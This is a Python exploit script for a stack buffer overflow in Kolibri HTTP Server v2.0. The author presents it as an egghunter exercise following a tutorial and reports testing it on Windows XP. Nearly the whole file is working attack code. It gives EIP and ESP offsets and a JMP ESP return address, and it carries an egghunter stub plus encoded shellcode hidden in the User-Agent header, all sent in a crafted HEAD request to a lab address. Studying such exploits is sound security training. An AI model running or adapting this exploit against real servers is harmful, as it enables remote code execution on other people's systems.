#!/usr/bin/python

# Author: Michael Music
# Date: 3/24/2019
# Description: Kolibri HTTP Server v2.0 EIP Overwrite BOF + egghunter
#  Exercise in egghunter BOFs following Fuzzysecurity's tutorial
#  Tested on Windows XP

import socket
import os
import sys

# EIP at 515
# ESP at 519
# EDI at 507
# JMP ESP at 0x7c9d30d7 in shell32.dll
# JMP -60 is \xEB\xC4

hunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x62\x33" #b3
"\x33\x66\x8b\xfa" #3f
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

buf = ''
buf += 'A' * (515-75)
buf += '\x90' * 25
buf += hunter
buf += 'A' * (50-32)
buf += '\xd7\x30\x9d\x7c'
buf += '\xEB\xC4'

shellcode = ''

buf2 = ''
buf2 += 'b33fb33f'
buf2 += "\x89\xe0\xd9\xc4\xd9\x70\xf4\x59\x49\x49\x49\x49\x49"
buf2 += "\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37"
buf2 += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf2 += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf2 += "\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x78\x68\x4e\x62"
buf2 += "\x33\x30\x75\x50\x45\x50\x61\x70\x4c\x49\x6b\x55\x70"
buf2 += "\x31\x4f\x30\x71\x74\x6c\x4b\x42\x70\x70\x30\x6e\x6b"
buf2 += "\x62\x72\x36\x6c\x4c\x4b\x62\x72\x55\x44\x4c\x4b\x31"
buf2 += "\x62\x71\x38\x54\x4f\x68\x37\x71\x5a\x64\x66\x54\x71"
buf2 += "\x49\x6f\x6c\x6c\x67\x4c\x53\x51\x33\x4c\x67\x72\x46"
buf2 += "\x4c\x51\x30\x49\x51\x58\x4f\x56\x6d\x53\x31\x49\x57"
buf2 += "\x59\x72\x5a\x52\x51\x42\x31\x47\x4e\x6b\x50\x52\x74"
buf2 += "\x50\x4e\x6b\x70\x4a\x57\x4c\x6e\x6b\x70\x4c\x34\x51"
buf2 += "\x32\x58\x4b\x53\x31\x58\x55\x51\x6a\x71\x62\x71\x6e"
buf2 += "\x6b\x51\x49\x47\x50\x56\x61\x78\x53\x6c\x4b\x73\x79"
buf2 += "\x32\x38\x78\x63\x67\x4a\x70\x49\x6e\x6b\x37\x44\x4c"
buf2 += "\x4b\x66\x61\x38\x56\x35\x61\x49\x6f\x6e\x4c\x39\x51"
buf2 += "\x48\x4f\x36\x6d\x53\x31\x68\x47\x55\x68\x59\x70\x42"
buf2 += "\x55\x4c\x36\x74\x43\x33\x4d\x6c\x38\x57\x4b\x33\x4d"
buf2 += "\x54\x64\x50\x75\x38\x64\x52\x78\x4e\x6b\x33\x68\x47"
buf2 += "\x54\x67\x71\x4a\x73\x61\x76\x6e\x6b\x36\x6c\x70\x4b"
buf2 += "\x4c\x4b\x51\x48\x45\x4c\x53\x31\x48\x53\x6c\x4b\x63"
buf2 += "\x34\x6e\x6b\x75\x51\x48\x50\x4e\x69\x43\x74\x46\x44"
buf2 += "\x54\x64\x73\x6b\x71\x4b\x30\x61\x62\x79\x70\x5a\x36"
buf2 += "\x31\x59\x6f\x49\x70\x71\x4f\x63\x6f\x33\x6a\x6e\x6b"
buf2 += "\x64\x52\x5a\x4b\x4c\x4d\x53\x6d\x52\x4a\x77\x71\x4c"
buf2 += "\x4d\x4e\x65\x68\x32\x35\x50\x57\x70\x57\x70\x72\x70"
buf2 += "\x73\x58\x45\x61\x4e\x6b\x70\x6f\x4c\x47\x69\x6f\x59"
buf2 += "\x45\x6f\x4b\x6c\x30\x6d\x65\x69\x32\x66\x36\x35\x38"
buf2 += "\x4f\x56\x6f\x65\x4d\x6d\x6d\x4d\x6b\x4f\x4a\x75\x55"
buf2 += "\x6c\x47\x76\x63\x4c\x54\x4a\x6d\x50\x39\x6b\x69\x70"
buf2 += "\x52\x55\x64\x45\x6f\x4b\x62\x67\x67\x63\x53\x42\x32"
buf2 += "\x4f\x30\x6a\x77\x70\x42\x73\x39\x6f\x6a\x75\x55\x33"
buf2 += "\x70\x61\x50\x6c\x72\x43\x34\x6e\x43\x55\x52\x58\x61"
buf2 += "\x75\x75\x50\x41\x41"
 
buffer = (
'HEAD /' + buf + ' HTTP/1.1\r\n'
'Host: 10.10.10.102:8080\r\n'
'User-Agent: ' + buf2 + '\r\n'
'Keep-Alive: 115\r\n'
'Connection: keep-alive\r\n\r\n')
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(('10.10.10.102', 8080))
expl.send(buffer)
expl.close()
